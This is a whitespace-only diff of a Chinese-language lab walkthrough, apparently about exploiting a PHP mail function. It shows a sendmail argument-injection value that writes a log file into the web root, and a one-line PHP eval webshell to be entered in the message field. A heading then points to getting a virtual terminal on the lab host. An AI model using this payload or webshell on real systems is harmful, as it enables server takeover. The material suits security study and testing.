@@ -42,7 +42,7 @@ http://192.168.1.107:8080/
 "aaa". -OQueueDirectory=/tmp/. -X/var/www/html/a.php @aaa.com
 在message处输入一句话木马：
 
-<?php @eval($_POST['thelostworld']); ?> 
+<?php @eval($_POST['thelostworld']); ?> 
 ```
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlNdXU5ZdmARDf3YdMwDfryK6ibibVal7ibO2c6EzWAFbbiay9P8XF242jSw/640?wx_fmt=png)
@@ -55,7 +55,7 @@ http://192.168.1.107:8080/
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1YhnxdlL4mp3kudzvwXdvC0bNvA7hibpmRfkrWhDLEdqZQVX5Y8SOkYOUcO3SA/640?wx_fmt=png)
 
- 虚拟终端：
+ 虚拟终端：
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcdntSN0777tibEtD1Yhnxdlrc7gRmfZibjaA1cicczYUaTHsUN5icwJ2iaT5Z9afAaB8ibvxR6Rn8qo6wQ/640?wx_fmt=png)
 
